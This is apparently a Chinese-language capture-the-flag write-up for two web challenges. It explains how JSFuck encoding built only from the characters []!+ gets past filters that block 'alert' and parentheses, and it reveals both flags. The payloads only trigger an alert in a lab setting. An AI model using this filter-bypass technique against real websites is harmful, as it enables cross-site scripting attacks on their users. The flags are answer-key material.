##**Topic**
web150

##**Steps**
题目循环检测alert并删除，试了各种编码无效，想到jsfuck编码可以被js执行，成功绕过。

![](http://oxm4hc2s3.bkt.clouddn.com/3.png)

当然要先闭合前边的引号，后边可以闭合或直接注释掉。

flag: **nuaactf{3a5y_xSS_23333_66666}**



##**Topic**
web300

##**Steps**
这就是这次比赛最开心的一道题了，进去之后发现正则匹配对输入进行了过滤，'[^\\[\\]\\!\\+]+/g'，也就是说只能使用 **[]!+** 四个字符进行构造，想到jsfuck， **eval(eval(input) + \'(1)\')** ，综合题意，只要可以使用eval(input)构造出'alert'字符串即可。

get到jsfuck的编码方式，就解开了本题。记录如下：

```jsfuck
以下内容基于
[]      =>  []

然后!可以将原类型转化为布尔型
![]     =>  false
!![]    =>  true

+可以将原类型转化为整形
+[]     =>  0
+![]    =>  0
+!![]   =>  1
然后可以推出所有数字 

然后+[]可以转化为字符串
[]+[]   =>  ""
![]+[]  =>  "false"
或放在前边
[]+![]  =>  "false"
+[]+[]  =>  "0"

加括号试试
([]+![])  =>  "false"
[[]+![]]  =>  ["false"]
(+[]+[])  =>  "0"
[+[]+[]]  =>  ["0"]

可以类似数组取下标
(![]+[])[+!![]] =>  'a'

然后就可以从'false', 'true'中依次读出'a','l','e','r','t'。em...但是题目过滤了小括号。需要稍微绕一下，考虑使用中括号
[[]+![]]    =>  ["false"]
[![]+[]][+[]]    =>  "false"
[![]+[]][+[]][+!![]]    =>  'a'

成功

最后用加号拼出"alert"即可。
```

![](http://oxm4hc2s3.bkt.clouddn.com/2.png)

flag: **nuaactf{NOT\_the\_jsF\*\*k\_at\_a11}**
